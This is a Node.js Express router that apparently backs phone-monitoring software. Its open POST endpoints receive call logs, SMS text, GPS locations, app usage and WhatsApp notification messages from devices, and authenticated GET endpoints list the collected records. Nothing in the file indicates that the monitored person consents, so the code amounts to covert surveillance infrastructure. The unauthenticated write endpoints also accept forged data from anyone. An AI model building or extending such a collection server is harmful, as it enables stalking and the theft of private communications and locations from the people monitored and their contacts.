const express = require('express');
const router = express.Router();
const Call = require('../models/Call');
const Sms = require('../models/Sms');
const Location = require('../models/Location');
const AppUsage = require('../models/AppUsage');
const Notification = require('../models/Notification');
const Device = require('../models/Device');

// POST /api/call
router.post('/call', async (req, res) => {
  try {
    const { deviceId, number, type, state, timestamp, duration } = req.body || {};
    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
    await Device.updateOne({ deviceId }, { $set: { lastSeen: new Date() } }, { upsert: true });
    const call = new Call({ deviceId, number, type, state, timestamp, duration });
    await call.save();
    res.json({ ok: true, id: call._id });
  } catch (e) { console.error(e); res.status(500).json({ error: 'server error' }); }
});

// POST /api/sms
router.post('/sms', async (req, res) => {
  try {
    const { deviceId, sender, message, timestamp } = req.body || {};
    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
    await Device.updateOne({ deviceId }, { $set: { lastSeen: new Date() } }, { upsert: true });
    const s = new Sms({ deviceId, sender, message, timestamp });
    await s.save();
    res.json({ ok: true, id: s._id });
  } catch (e) { console.error(e); res.status(500).json({ error: 'server error' }); }
});

// POST /api/location
router.post('/location', async (req, res) => {
  try {
    const { deviceId, lat, lon, accuracy, timestamp } = req.body || {};
    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
    await Device.updateOne({ deviceId }, { $set: { lastSeen: new Date() } }, { upsert: true });
    const l = new Location({ deviceId, lat, lon, accuracy, timestamp });
    await l.save();
    res.json({ ok: true, id: l._id });
  } catch (e) { console.error(e); res.status(500).json({ error: 'server error' }); }
});

// POST /api/app-usage
router.post('/app-usage', async (req, res) => {
  try {
    const { deviceId, packageName, totalTime, lastTimeUsed } = req.body || {};
    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
    await Device.updateOne({ deviceId }, { $set: { lastSeen: new Date() } }, { upsert: true });
    const a = new AppUsage({ deviceId, packageName, totalTime, lastTimeUsed });
    await a.save();
    res.json({ ok: true, id: a._id });
  } catch (e) { console.error(e); res.status(500).json({ error: 'server error' }); }
});

// POST /api/whatsapp
router.post('/whatsapp', async (req, res) => {
  try {
    const { deviceId, message, timestamp, packageName } = req.body || {};
    if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
    await Device.updateOne({ deviceId }, { $set: { lastSeen: new Date() } }, { upsert: true });
    const n = new Notification({ deviceId, packageName, message, timestamp });
    await n.save();
    res.json({ ok: true, id: n._id });
  } catch (e) { console.error(e); res.status(500).json({ error: 'server error' }); }
});

// GET endpoints for frontend (protected by auth?) - we keep them publicly accessible only with auth in frontend
const auth = require('./_auth_mw');
router.get('/sms', auth, async (req, res) => {
  const docs = await Sms.find({}).sort({ createdAt: -1 }).limit(500).lean();
  res.json(docs);
});
router.get('/call', auth, async (req, res) => {
  const docs = await Call.find({}).sort({ createdAt: -1 }).limit(500).lean();
  res.json(docs);
});
router.get('/location', auth, async (req, res) => {
  // optional ?deviceId= to filter
  const filter = {};
  if (req.query.deviceId) filter.deviceId = req.query.deviceId;
  const docs = await Location.find(filter).sort({ createdAt: -1 }).limit(1000).lean();
  res.json(docs);
});
router.get('/app-usage', auth, async (req, res) => {
  const docs = await AppUsage.find({}).sort({ createdAt: -1 }).limit(500).lean();
  res.json(docs);
});
router.get('/whatsapp', auth, async (req, res) => {
  const docs = await Notification.find({}).sort({ createdAt: -1 }).limit(500).lean();
  res.json(docs);
});

module.exports = router;
